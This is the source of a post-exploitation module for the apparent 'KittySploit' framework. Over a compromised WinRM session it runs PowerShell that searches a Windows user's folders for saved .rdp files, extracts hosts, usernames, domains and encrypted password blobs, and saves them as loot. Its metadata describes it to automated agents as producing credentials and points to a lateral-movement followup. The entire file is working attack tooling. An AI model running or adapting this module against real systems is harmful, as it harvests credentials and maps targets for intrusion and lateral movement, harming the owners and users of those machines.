#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.winrm.winrm_session_mixin import WinRMSessionMixin
import re


class Module(Post, WinRMSessionMixin):
	__info__ = {
		"name": "WinRM Gather RDP Files",
		"description": "Find and parse saved .rdp client files through a WinRM session",
		"author": "KittySploit Team",
		"platform": Platform.WINDOWS,
		"session_type": SessionType.WINRM,
		"references": ["https://attack.mitre.org/techniques/T1021.001/"],
		"agent": {
			"risk": "intrusive",
			"effects": ["active_exploitation"],
			"expected_requests": 2,
			"reversible": False,
			"approval_required": True,
			"produces": ["credentials"],
			"chain": {
				"consumes_capabilities": ["authenticated_session"],
				"produces_capabilities": ["rdp_targets"],
				"suggested_followups": ["post/winrm/manage/lateral_winrm"],
			},
		},
	}

	save_local = OptBool(True, "Save results under ./output", False)

	def _script(self) -> str:
		return r"""
$searchDirs = @(
  (Join-Path $env:USERPROFILE 'Documents'),
  (Join-Path $env:USERPROFILE 'Desktop'),
  (Join-Path $env:APPDATA 'Microsoft\Windows\Recent')
) | Where-Object { Test-Path -LiteralPath $_ }

$rdpFiles = New-Object System.Collections.Generic.List[string]
foreach ($dir in $searchDirs) {
  Get-ChildItem -LiteralPath $dir -Filter '*.rdp' -File -Recurse -Depth 2 -ErrorAction SilentlyContinue |
    ForEach-Object { $rdpFiles.Add($_.FullName) }
}
$defaultRdp = Join-Path $env:USERPROFILE 'Documents\Default.rdp'
if ((Test-Path -LiteralPath $defaultRdp) -and ($rdpFiles -notcontains $defaultRdp)) {
  $rdpFiles.Add($defaultRdp)
}
$rdpFiles = $rdpFiles | Select-Object -Unique
if ($rdpFiles.Count -eq 0) {
  Write-Output 'No .rdp files found in common user locations.'
  return
}

$interesting = @(
  'full address:s:', 'username:s:', 'domain:s:', 'alternate shell:s:',
  'drivestoredirect:s:', 'redirectclipboard:i:', 'redirectprinters:i:',
  'authentication level:i:', 'prompt for credentials:i:', 'password 51:b:'
)
$sections = New-Object System.Collections.Generic.List[string]
foreach ($file in $rdpFiles) {
  $lines = Get-Content -LiteralPath $file -ErrorAction SilentlyContinue
  $picked = $lines | Where-Object {
    $line = $_.Trim().ToLower()
    foreach ($key in $interesting) { if ($line.StartsWith($key)) { return $true } }
    $false
  }
  if (-not $picked) { $picked = $lines | Select-Object -First 25 }
  $hasPwd = $lines | Where-Object { $_.Trim().ToLower().StartsWith('password 51:b:') }
  $note = if ($hasPwd) { "`n(note: embedded password is DPAPI/CredSSP encrypted)" } else { '' }
  $sections.Add("=== $file ===`n$($picked -join "`n")$note")
}
$sections -join "`n`n"
"""

	def run(self):
		try:
			print_status("Searching saved .rdp files over WinRM...")
			result = self.winrm_run_encoded_ps(self._script())
			if not result:
				raise ProcedureError(FailureType.Unknown, "No output returned")
			if re.search(r"No \.rdp files found", result, re.I):
				print_warning(result)
				return True
			if self._bool_opt(self.save_local, True):
				path = self.winrm_save_loot(result, "winrm_rdp_files")
				print_success(f"Saved to ./{path}")
			print_success("RDP file extraction completed")
			print_info(result)
			return True
		except ProcedureError:
			raise
		except Exception as exc:
			raise ProcedureError(FailureType.Unknown, f"WinRM RDP dump error: {exc}")
